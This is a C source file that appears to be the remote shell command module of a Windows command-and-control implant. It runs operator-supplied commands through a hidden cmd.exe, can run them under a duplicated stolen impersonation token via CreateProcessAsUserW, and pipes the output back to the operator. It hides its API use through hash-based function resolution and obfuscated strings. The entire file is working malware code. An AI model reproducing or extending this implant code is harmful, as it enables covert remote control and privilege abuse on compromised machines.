#include "config.h"
#ifdef INCLUDE_CMD_SHELL

#include "commands.h"
#include "common.h"

typedef BOOL (WINAPI *fn_CreateProcessAsUserW)(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL (WINAPI *fn_DuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, PHANDLE);

#define TOKEN_SHELL_DUPLICATE   0x0002
#define TOKEN_SHELL_QUERY       0x0008
#define TOKEN_SHELL_IMPERSONATE 0x0004
#define TOKEN_SHELL_ASSIGN_PRI  0x0001
#define SecurityDelegation_Shell 3
#define TOKEN_TYPE_PRIMARY_SHELL 1

VOID cmd_shell(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD cmd_len = 0;
    char* cmd = parser_string(args, &cmd_len);
    if (!cmd || cmd_len == 0) {
        package_add_string(inst, response, XSTR("No command specified"));
        response->is_error = TRUE;
        return;
    }

    xstr(_prefix, "cmd.exe /c ");
    static char full_cmd[2048] = {0};
    es_memcpy(full_cmd, _prefix, 11);
    DWORD copylen = cmd_len < (sizeof(full_cmd) - 12) ? cmd_len : (sizeof(full_cmd) - 12);
    es_memcpy(full_cmd + 11, cmd, copylen);
    full_cmd[11 + copylen] = '\0';

    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    typedef BOOL (WINAPI *fnCreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
    fnCreatePipe pCreatePipe = (fnCreatePipe)resolve_function(inst->Modules.Kernel32, hash_string_djb2(XSTR("CreatePipe")));
    if (!pCreatePipe) return;

    if (!pCreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return;

    PROCESS_INFORMATION pi = {0};
    BOOL ok = FALSE;

    // If we have an impersonation token, try CreateProcessAsUserW with a primary token
    if (inst->ImpersonationToken) {
        xstr(_adv, "advapi32.dll");
        HMODULE h_adv = inst->Win32.LoadLibraryA(_adv);
        if (h_adv) {
            fn_CreateProcessAsUserW pCreateAsUser = (fn_CreateProcessAsUserW)resolve_function(
                (PVOID)h_adv, hash_string_djb2(XSTR("CreateProcessAsUserW")));
            fn_DuplicateTokenEx pDupToken = (fn_DuplicateTokenEx)resolve_function(
                (PVOID)h_adv, hash_string_djb2(XSTR("DuplicateTokenEx")));

            if (pCreateAsUser && pDupToken) {
                // Duplicate the impersonation token to a primary token
                HANDLE h_primary = NULL;
                SECURITY_ATTRIBUTES sa_tok = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
                if (pDupToken(inst->ImpersonationToken,
                        TOKEN_SHELL_QUERY | TOKEN_SHELL_DUPLICATE | TOKEN_SHELL_ASSIGN_PRI | TOKEN_SHELL_IMPERSONATE,
                        &sa_tok, SecurityDelegation_Shell, TOKEN_TYPE_PRIMARY_SHELL, &h_primary)) {

                    // Convert the ANSI command to wide for CreateProcessAsUserW
                    static wchar_t w_cmd[2048] = {0};
                    DWORD total_len = 11 + copylen;
                    inst->Win32.MultiByteToWideChar(0 /*CP_ACP*/, 0, full_cmd, total_len + 1, w_cmd, 2048);

                    STARTUPINFOW siw = {0};
                    siw.cb = sizeof(siw);
                    siw.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                    siw.hStdOutput = hWritePipe;
                    siw.hStdError  = hWritePipe;
                    siw.wShowWindow = SW_HIDE;

                    ok = pCreateAsUser(h_primary, NULL, w_cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &siw, &pi);

                    gate_CloseHandle(inst, h_primary);
                }
            }
        }
    }

    // Fallback: standard CreateProcessA if no token or token path failed
    if (!ok) {
        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdOutput = hWritePipe;
        si.hStdError  = hWritePipe;
        si.wShowWindow = SW_HIDE;

        ok = inst->Win32.CreateProcessA(
            NULL, full_cmd, NULL, NULL, TRUE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }

    gate_CloseHandle(inst, hWritePipe);

    if (!ok) {
        gate_CloseHandle(inst, hReadPipe);
        package_add_string(inst, response, XSTR("Failed to execute command"));
        response->is_error = TRUE;
        return;
    }

    gate_WaitForSingleObject(inst, pi.hProcess, 30000);

    // Non-blocking drain: blocking ReadFile here hangs forever if conhost
    // (spawned for the child console) inherits the write handle and outlives
    // cmd.exe.
    static BYTE read_buf[4096];
    DWORD read_bytes;
    DWORD waited = 0;
    while (waited < 60000) {
        DWORD avail = 0;
        if (!inst->Win32.PeekNamedPipe(hReadPipe, NULL, 0, NULL, &avail, NULL))
            break;
        if (avail > 0) {
            if (!inst->Win32.ReadFile(hReadPipe, read_buf, sizeof(read_buf) - 1, &read_bytes, NULL) || read_bytes == 0)
                break;
            read_buf[read_bytes] = 0;
            package_add_bytes(inst, response, read_buf, read_bytes);
        } else {
            if (gate_WaitForSingleObject(inst, pi.hProcess, 0) != 0x102 /*WAIT_TIMEOUT*/)
                break;
            inst->Win32.Sleep(50);
            waited += 50;
        }
    }

    gate_CloseHandle(inst, pi.hProcess);
    gate_CloseHandle(inst, pi.hThread);
    gate_CloseHandle(inst, hReadPipe);
}

#endif
